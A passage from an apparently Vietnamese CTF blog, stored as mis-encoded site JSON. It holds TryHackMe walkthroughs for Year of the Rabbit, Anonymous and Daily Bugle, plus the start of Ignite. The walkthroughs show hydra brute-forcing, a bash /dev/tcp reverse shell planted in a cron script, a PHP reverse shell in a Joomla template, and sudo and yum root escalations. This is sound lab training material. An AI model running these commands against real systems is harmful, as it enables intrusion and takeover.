há»¯u Ã­ch Ä‘á»ƒ táº¡o container cho cáº£ há»‡ Ä‘iá»u hÃ nh vÃ  tÃ´i cÃ³ thá»ƒ Ä‘áº©y nÃ³ lÃªn báº¥t cá»© Ä‘Ã¢u mÃ  khÃ´ng pháº£i cÃ i láº¡i cáº£ há»‡ Ä‘iá»u hÃ nh.\n","date":"17 November 2021","externalUrl":null,"permalink":"/ctf/tryhackme/gamingserver/","section":"Ctf","summary":"","title":"Tryhackme - GamingServer","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Year of the Rabbit.\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng.\nPORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 3.0.2 22/tcp open ssh syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA== | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8= | 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh 80/tcp open http syn-ack Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port 21 khÃ´ng thá»ƒ login, port 80 thÃ¬ tÃ´i cÃ³ 1 default page. KhÃ´ng cÃ³ gÃ¬ quÃ¡ Ä‘áº·c biá»‡t Ä‘á»ƒ khai thÃ¡c manual nÃªn tÃ´i sáº½ dÃ¹ng dirsearch tÃ¬m web path.\n200 - 1KB - /assets/ 301 - 315B - /assets -\u0026gt; http://10.10.173.165/assets/ 200 - 8KB - /index.html á» /assets/ tÃ´i cÃ³ 1 quáº£ meme huyá»n thoáº¡i nÃ y vÃ  1 file style.css. Xem qua file css nÃ y thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c 1 path má»›i.\nVÃ o path nÃ y thÃ¬ tÃ´i cÃ³ 1 popup\nNáº¿u áº¥n OK thÃ¬ nÃ³ sáº½ quay trá»Ÿ láº¡i cÃ¡i meme bÃªn trÃªn \u0026#x1f611; Tuy nhiÃªn náº¿u khÃ´ng áº¥n OK thÃ¬ page váº«n loading, tÃ´i nghÄ© ráº±ng nÃ³ Ä‘ang chá» Ä‘á»ƒ redirect, thá»­ má»Ÿ BurpSuite vÃ  kiá»ƒm tra vÃ  tÃ´i tÃ¬m ra hidden_directory\nTrong dir áº©n nÃ y tÃ´i cÃ³ 1 bá»©c áº£nh, cÅ©ng khÃ´ng Ä‘á»ƒ lÃ m gÃ¬, dÃ¹ng binwalk hay steghide cÅ©ng khÃ´ng ra gÃ¬, máº¥t vÃ i phÃºt báº¿ táº¯c thÃ¬ tÃ´i Ä‘Ã¡p nÃ³ lÃªn hexed.it vÃ  tÃ¬m ra user ftp server.\nVáº­y lÃ  tÃ´i cÃ³ ftp username vÃ  1 list password. Copy list nÃ y vÃ o 1 file wordlist vÃ  burteforce nÃ³ vá»›i hydra.\nâ”Œâ”€â”€(neoã‰¿kali)-[~/Downloads] â””â”€$ hydra -l ftpuser -P wordlist ftp://10.10.65.86 Hydra v9.3 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-03 03:36:22 [DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task [DATA] attacking ftp://10.10.65.86:21/ [21][ftp] host: 10.10.65.86 login: ftpuser password: ************* 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-03 03:36:38 Login vÃ o ftp server, tÃ´i cÃ³ 1 file txt, láº¥y nÃ³ vá» vÃ  tÃ´i cÃ³ 1 Ä‘oáº¡n mÃ£ Brainfuck, ngÃ´n ngá»¯ láº­p trÃ¬nh háº¡i nÃ£o nháº¥t mÃ  tÃ´i tá»«ng biáº¿t, copy Ä‘oáº¡n mÃ£ tÃ´i cÃ³ vÃ o Ä‘Ã¢y vÃ  tÃ´i cÃ³ 1 cáº·p username - password.\nSSH # Login vÃ o ssh\neli@10.10.65.86\u0026#39;s password: 1 new message Message from Root to Gwendoline: \u0026#34;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I\u0026#39;ve left you a hidden message there\u0026#34; END MESSAGE eli@year-of-the-rabbit:~$ TÃ´i cÃ³ 1 message á»Ÿ Ä‘Ã¢y nhÆ°ng khÃ´ng pháº£i cho Eli mÃ  cho Gwendoline, trong thÆ° má»¥c /home/ cÅ©ng cÃ³ user nÃ y vÃ  user flag cÅ©ng náº±m á»Ÿ Ä‘Ã¢y. Tuy nhiÃªn user Eli khÃ´ng cÃ³ quyá»n truy cáº­p. Quay láº¡i message thÃ¬ nÃ³ nÃ³i ráº±ng cÃ³ 1 nÆ¡i gá»i lÃ  s3cr3t hiding place, váº­y thÃ¬ Ä‘Ã¢y cÃ³ thá»ƒ láº§ 1 thÆ° má»¥c nÃ o Ä‘Ã³.\neli@year-of-the-rabbit:~$ find / -type d -name *s3cr3t* 2\u0026gt;/dev/null /usr/games/s3cr3t eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t/ eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la total 12 drwxr-xr-x 2 root root 4096 Jan 23 2020 . drwxr-xr-x 3 root root 4096 Jan 23 2020 .. -rw-r--r-- 1 root root 138 Jan 23 2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly! Sá»­ dá»¥ng pass cÃ³ Ä‘Æ°á»£c Ä‘á»ƒ Ä‘á»•i user vÃ  tÃ´i cÃ³ user flag.\nPrivilege escalation # sudo -l:\ngwendoline@year-of-the-rabbit:~$ sudo -l Matching Defaults entries for gwendoline on year-of-the-rabbit: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User gwendoline may run the following commands on year-of-the-rabbit: (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt VÃ o GTFOBins Ä‘á»ƒ tÃ¬m sudo. Tuy nhiÃªn user gwendoline khÃ´ng thá»ƒ sá»­ dá»¥ng sudo Ä‘á»ƒ thá»±c thi lá»‡nh. TÃ´i thá»­ check version cá»§a sudo: Sudo version 1.8.10p3 vÃ  tÃ¬m Ä‘Æ°á»£c vÃ i thá»© hay ho trÃªn exploit-db. TÃ´i cÃ³ thá»ƒ sá»­ dá»¥ng sudo -u#-1 Ä‘á»ƒ thá»±c hiá»‡n lá»‡nh vi vá»›i file user.txt\ngwendoline@year-of-the-rabbit:~$ sudo -u#-1 vi /home/gwendoline/user.txt # id uid=0(root) gid=0(root) groups=0(root) Done.\nTá»•ng káº¿t # BÃ i nÃ y khÃ¡ hay vÃ¬ pháº£i káº¿t há»£p nhiá»u thÃ´ng tin cÅ©ng nhÆ° nhiá»u cÃ´ng cá»¥. Äáº·c biá»‡t lÃ  cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i exploit sudo. VÃ  biáº¿t thÃªm 1 ngÃ´n ngá»¯ láº­p trÃ¬nh má»›i lÃ  Brainfuck, máº·c dÃ¹ váº­y tÃ´i khÃ´ng nghÄ© lÃ  ngÃ´n ngá»¯ nÃ y cÃ³ tÃ­nh á»©ng dá»¥ng cao, chá»§ yáº¿u Ä‘á»ƒ giáº£i trÃ­ vÃ  lÃ m CTF, hoáº·c do tÃ´i chÆ°a tÃ¬m Ä‘Æ°á»£c pháº§n má»m hay chÆ°Æ¡ng trÃ¬nh nÃ o viáº¿t báº±ng ngÃ´n ngá»¯ nÃ y, who knows!\nÄá»c thÃªm: Sudo\n","date":"12 November 2021","externalUrl":null,"permalink":"/ctf/tryhackme/year-of-the-rabbit/","section":"Ctf","summary":"","title":"Tryhackme - Year of the Rabbit","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Anonymous.\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ rustscan -a 10.10.135.18 -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Real hackers hack time âŒ› [~] The config file is expected to be at \u0026#34;/home/neo/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.135.18:21 Open 10.10.135.18:22 Open 10.10.135.18:139 Open 10.10.135.18:445 á» Ä‘Ã¢y tÃ´i cÃ³ port 139 vÃ  445, 2 port sá»­ dá»¥ng trong SMB cá»§a Windows. Ã€ trÆ°á»›c Ä‘Ã³ thÃ¬ thá»­ truy cáº­p vÃ o port 21 vá»›i Anonymous xem cÃ³ gÃ¬ hay ho khÃ´ng.\nftp\u0026gt; ls 229 Entering Extended Passive Mode (|||36762|) 150 Here comes the directory listing. drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts 226 Directory send OK. ftp\u0026gt; cd scripts 250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||60923|) 150 Here comes the directory listing. -rwxr-xrwx 1 1000 1000 314 Jun 04 2020 clean.sh -rw-rw-r-- 1 1000 1000 1634 Jul 30 08:50 removed_files.log -rw-r--r-- 1 1000 1000 68 May 12 2020 to_do.txt NhÃ¬n vÃ o phÃ¢n quyá»n cá»§a /scripts/ vÃ  file clean.sh thÃ¬ tÃ´i cÃ³ thá»ƒ sá»­a file. Láº¥y cÃ¡c file nÃ y vá» vÃ  thá»­ kiá»ƒm tra thÃ¬ tÃ´i nháº­n ra Ä‘Ã¢y file clean.sh cháº¡y liÃªn tá»¥c Ä‘á»ƒ ghi dá»¯ liá»‡u vÃ o file removed_files.log.\nTá»« 2 Ä‘iá»u nÃ y tÃ´i nghÄ© ráº±ng mÃ¬nh cÃ³ thá»ƒ thÃªm payload vÃ o file thá»±c thi sau Ä‘Ã³ put láº¡i lÃªn ftp server, file thá»±c thi sáº½ cháº¡y payload vÃ  tÃ´i sáº½ cÃ³ shell. TÃ´i dÃ¹ng payload cá»§a pentestmonkey: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.135.18/12345 0\u0026gt;\u0026amp;1\nTrÆ°á»›c khi put file thÃ¬ táº¡o listner tá»« local machine: nc -lnvp 12345\nftp\u0026gt; put /home/neo/THM-Anonymous/clean.sh clean.sh local: /home/neo/THM-Anonymous/clean.sh remote: clean.sh 229 Entering Extended Passive Mode (|||14310|) 150 Ok to send data. 100% |************************************************************************************************************************************************| 356 5.30 MiB/s 00:00 ETA 226 Transfer complete. â”Œâ”€â”€(neoã‰¿kali)-[~/THM-Anonymous] â””â”€$ nc -lnvp 12345 listening on [any] 12345 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.135.18] 34374 bash: cannot set terminal process group (1460): Inappropriate ioctl for device bash: no job control in this shell namelessone@anonymous:~$ ls pics user.txt namelessone@anonymous:~$ Váº­y lÃ  tÃ´i cÃ³ user flag.\nPrivilege escalation # TÃ´i thá»­ sudo -l nhÆ°ng bá»‹ yÃªu cáº§u password, bá» qua cÃ¡ch nÃ y. TÃ´i Ä‘á»ƒ Ã½ cÃ²n thÆ° má»¥c pics, trong nÃ y cÃ³ 2 file áº£nh, tÃ´i sáº½ táº¡o http server trÃªn Ä‘Ã¢y vÃ  wget 2 file nÃ y vá» Ä‘á»ƒ xem cÃ³ gÃ¬ Ä‘áº·c biá»‡t khÃ´ng. VÃ  sau 1 lÃºc thÃ¬ khÃ´ng =))))\nTÃ´i cÃ²n 1 cÃ¡ch khÃ¡c lÃ  tÃ¬m progame vá»›i SUID cá»§a root: find / -type f -perm -u=s 2\u0026gt;/dev/null, vÃ  nÃ³ ra 1 list ráº¥t nhiá»u thá»©, nhÆ°ng thá»© Ä‘áº­p vÃ o máº¯t tÃ´i lÃ  /usr/bin/env. env lÃ  lá»‡nh cho phÃ©p cháº¡y 1 chÆ°Æ¡ng trÃ¬nh khÃ¡c trong mÃ´i trÆ°á»ng tÃ¹y chá»‰nh mÃ  khÃ´ng cáº§n thay Ä‘á»•i chÆ°Æ¡ng tÃ¬nh Ä‘ang cháº¡y hiá»‡n táº¡i. NÃ³ khÃ¡ há»¯u Ã­ch khi chÃºng ta muá»‘n cÃ³ 1 mÃ´i trÆ°á»ng áº£o Ä‘á»ƒ test cÃ¡c chÆ°Æ¡ng trÃ¬nh hay cÃ i Ä‘áº·t cÃ¡c packages mÃ  khÃ´ng muá»‘n nÃ³ gÃ¢y áº£nh hÆ°á»Ÿng Ä‘áº¿n há»‡ thá»‘ng Ä‘ang hoáº¡t Ä‘á»™ng.\nTÃ´i vÃ o GTFOBins vÃ  tÃ¬m tháº¥y env cÃ³ SUID, thá»­ xem sao.\nnamelessone@anonymous:~$ env /bin/sh -p # id uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd) # whoami root # ls /root root.txt # Conclusion # Qua bÃ i nÃ y tÃ´i biáº¿t thÃªm vá» env vÃ  cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i SUID. CÃ²n láº¡i thÃ¬ cÅ©ng khÃ´ng cÃ³ gÃ¬ má»›i láº¯m.\nÄá»c thÃªm vá» env Äá»c thÃªm vá» SUID ","date":"27 October 2021","externalUrl":null,"permalink":"/ctf/tryhackme/anonymous/","section":"Ctf","summary":"","title":"Tryhackme - Anonymous","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Daily Bugle. GÃ©c gÃ´!!!\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B | 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src= | 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX 80/tcp open http syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 3306/tcp open mysql syn-ack MariaDB (unauthorized) Vá»›i port 80 tÃ´i tháº¥y cÃ³ path /joomla/, váº­y lÃ  web nÃ y Ä‘Æ°á»£c buil trÃªn Joomla CMS, vÃ  náº¿u qua path /administrator/ thÃ¬ tÃ´i sáº½ vÃ o Ä‘Æ°á»£c login page joomla. Tuy nhiÃªn vá»›i kiáº¿n thá»©c háº¡n háº¹p, pháº£i loay hoay 1 lÃºc lÃ¢u tÃ´i má»›i tÃ¬m ra Ä‘Æ°á»£c version joomla Ä‘ang cháº¡y trÃªn machine nÃ y.\nLá»™i qua 1 Ä‘á»‘ng tool thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c tháº±ng nÃ y: juumla giÃºp check version cÅ©ng nhÆ° tÃ¬m find backup hay config, khÃ¡ tiá»‡n.\nâ”Œâ”€â”€(neoã‰¿kali)-[~/juumla] â””â”€$ python main.py -u http://10.10.91.181 jUuMlA - 0.1.4 most overrated joomla scanner \u0026gt; Checking if target is running Joomla... \u0026gt; Running Joomla version scanner... [1/3] \u0026gt; Joomla version is: 3.7.0 \u0026gt; Running Joomla vulnerabilities scanner... [2/3] \u0026gt; Joomla! 3.7 - SQL Injection \u0026gt; Vulnerabilities scanner finished [2/3] Check trÃªn exploit-db TÃ´i cÃ³ 1 SQLi, cháº¡y thá»­ sqlmap nhÆ°ng nÃ³ quÃ¡ lÃ¢u (lÃ¢u vÃ´ háº¡nnnn =.=). Váº­y nÃªn tÃ´i thá»­ tÃ¬m trÃªn github xem cÃ³ payload joomla version 3.7.0 khÃ´ng. VÃ  nÃ³ á»Ÿ Ä‘Ã¢y.\nClone nÃ³ vá» vÃ  cháº¡y vá»›i IP machine vÃ  tÃ´i cÃ³ luÃ´n user trong 1 phÃºt, phÃ­ máº¥t 15 phÃºt ngá»“i chá» tháº±ng sqlmap, ngáº«n quÃ¡ \u0026#x1f613;\n[$] Found user [\u0026#39;811\u0026#39;, \u0026#39;Super User\u0026#39;, \u0026#39;jonah\u0026#39;, \u0026#39;jonah@tryhackme.com\u0026#39;, \u0026#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;] NÃ©m tháº±ng hash nÃ y vÃ o 1 file vÃ o dÃ¹ng john Ä‘á»ƒ decrypt nÃ³.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ sudo john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:01:43 13.62% (ETA: 04:25:48) 0g/s 78.57p/s 78.57c/s 78.57C/s piccolo..yahweh spiderman123 (?) Upload reverse shell # Login vÃ o joomla Ä‘á»ƒ upload shell. Dáº¡o quanh 1 lÃºc thÃ¬ tÃ´i tháº¥y template lÃ  nÆ¡i cÃ³ thá»ƒ upload shell vÃ¬ nÃ³ sáº½ lÃ  thá»© hiá»‡n ra cho ngÆ°á»i dÃ¹ng khi há» truy cáº­p vÃ o trang web.\nSá»­a file php cÃ³ sáºµn trong template thÃ nh reverse shell php, shell nÃ y tÃ´i láº¥y tá»« pentestmonkey, sá»­a listen host vÃ  port thÃ nh ip machine cá»§a mÃ¬nh.\nTáº¡o listener báº±ng netcat: nc -lnvp 2402 sau Ä‘Ã³ truy cáº­p vÃ o file vá»«a sá»­a: http://IP-MACHINE/templates/beez3/index.php\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.71.145] 37496 Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 23:38:06 up 36 min, 0 users, load average: 0.03, 0.04, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=48(apache) gid=48(apache) groups=48(apache) sh: no job control in this shell sh-4.2$ Config láº¡i shell báº±ng python nhÆ°ng khÃ´ng Ä‘Æ°á»£c, trong thÆ° má»¥c /home tÃ´i cÃ³ thÆ° má»¥c jjameson nhÆ°ng khÃ´ng thá»ƒ truy cáº­p. TÃ´i sáº½ tÃ¬m xung quanh xem cÃ³ password cá»§a Ã´ng nÃ y khÃ´ng. TÃ´i sáº½ Æ°u tiÃªn cÃ¡c file config vÃ¬ thÆ°á»ng thÃ¬ cÃ¡c user vÃ  passwd sáº½ Ä‘Æ°á»£c lÆ°u á»Ÿ Ä‘Ã¢y. ThÃªm ná»¯a Ä‘Ã¢y lÃ  web Ä‘Æ°á»£c buil trÃªn php nÃªn tÃ´i sáº½ thá»­ tÃ¬m file config.php xem cÃ³ thu Ä‘Æ°á»£c gÃ¬ Ä‘áº·c biá»‡t khÃ´ng.\nSau khi láº§n mÃ² trong thÆ° má»¥c lÆ°u trá»¯ web (thÆ°á»ng lÃ  /var/www/html/) tÃ´i tÃ¬m tháº¥y 2 file configuration.php vÃ  web.config.php\nsu jjameson Password: nv5uz9r3ZEDzVjNu id uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson) VÃ o thÆ° má»¥c jjameson vÃ  tÃ´i cÃ³ user flag\n[jjameson@dailybugle ~]$ ls user.txt Privilege escalation # Lá»‡nh sudo -l Ä‘á»ƒ kiá»ƒm tra xem user jjameson cÃ³ cháº¡y command nÃ o vá»›i quyá»n root khÃ´ng\n[jjameson@dailybugle ~]$ sudo -l Matching Defaults entries for jjameson on dailybugle: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User jjameson may run the following commands on dailybugle: (ALL) NOPASSWD: /usr/bin/yum TÃ´i láº¡i lÆ°á»£n qua GTFOBins xem cÃ¡ch lÃªn root báº±ng yum. Do tÃ´i khÃ´ng tháº¥y fpm á»Ÿ pháº§n a xuáº¥t hiá»‡n trong machine nÃªn tÃ´i sáº½ thá»­ dÃ¹ng cÃ¡ch b.\nTF=$(mktemp -d) cat \u0026gt;$TF/x\u0026lt;\u0026lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat \u0026gt;$TF/y.conf\u0026lt;\u0026lt;EOF [main] enabled=1 EOF cat \u0026gt;$TF/y.py\u0026lt;\u0026lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=\u0026#39;2.1\u0026#39; def init_hook(conduit): os.execl(\u0026#39;/bin/sh\u0026#39;,\u0026#39;/bin/sh\u0026#39;) EOF sudo yum -c $TF/x --enableplugin=y sh-4.2# id uid=0(root) gid=0(root) groups=0(root) sh-4.2# ls /root/root.txt /root/root.txt Tá»•ng káº¿t # Qua bÃ i nÃ y chÃºng ta biáº¿t thÃªm vá» Joomla cms, biáº¿t Ä‘Ã¢u sau nÃ y láº¡i cÃ³ há»©ng thÃº táº¡o web báº±ng tháº±ng nÃ y. Tiáº¿p theo lÃ  cÃ¡ch sá»­ dá»¥ng exploit-db Ä‘á»ƒ tÃ¬m kiáº¿m lá»— há»•ng trong cÃ¡c phiÃªn báº£n cá»§a á»©ng dá»¥ng, cÃ¡ch sá»­ dá»¥ng john-the-ripper Ä‘á»ƒ decrypt file hash. Cuá»‘i cÃ¹ng lÃ  cÃ¡ch sá»­ dá»¥ng yum Ä‘á»ƒ leo thang Ä‘áº·c quyá»n. Yeah cháº¯c váº­y lÃ  Ä‘á»§ rá»“i.\n","date":"24 October 2021","externalUrl":null,"permalink":"/ctf/tryhackme/daily-bugle/","section":"Ctf","summary":"","title":"Tryhackme - Daily Bugle","type":"ctf"},{"content":"","date":"24 October 2021","externalUrl":null,"permalink":"/tags/wget/","section":"Tags","summary":"","title":"Wget","type":"tags"},{"content":"","date":"20 October 2021","externalUrl":null,"permalink":"/tags/exploit-db/","section":"Tags","summary":"","title":"Exploit-Db","type":"tags"},{"content":"","date":"20 October 2021","externalUrl":null,"permalink":"/tags/fuel-cms/","section":"Tags","summary":"","title":"Fuel-Cms","type":"tags"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Ignite. GÃ©c gÃ´!!!\nVáº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cá»•ng.\nTÃ´i chá»‰ cÃ³ 1 port Ä‘ang má»Ÿ lÃ  port 80 cháº¡y Apache httpd 2.4.18 trÃªn Ubuntu server.\nVá»›i http-header Fuel CMS, cÃ³ nghÄ©a lÃ  site nÃ y dá»±ng trÃªn cms fuel phiÃªn báº£n 1.4. Trong file robots.txt cÃ³ 1 entry lÃ  /fuel. Path nÃ y sáº½ Ä‘iá»u hÆ°á»›ng web Ä‘áº¿n trang login cá»§a fuel cms.\nTÃ´i thá»­ login vÃ o site báº±ng username vÃ  password máº·c Ä‘á»‹nh: admin-admin.\nSite dashboard cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t láº¯m. Thá»±c ra thÃ¬ khi nhÃ¬n tháº¥y fuel cms tÃ´i Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c tÃ¬m exploit-db hoáº·c searchsploit, nhÆ°ng vÃ¬ Ä‘Æ°á»£c cho login tá»« Ä‘áº§u nÃªn bÃ¢y giá» tÃ´i má»›i thá»­.\nVá»›i 3 exploit RCE nÃ y, tÃ´i chá»n cÃ¡i thá»© 3 vÃ¬ nÃ³ lÃ  python code vÃ  cháº¡y trÃªn php.\nCÃ³ shell rá»“i nÃ y. TÃ´i sáº½ dÃ¹ng python reverse shell Ä‘á»ƒ 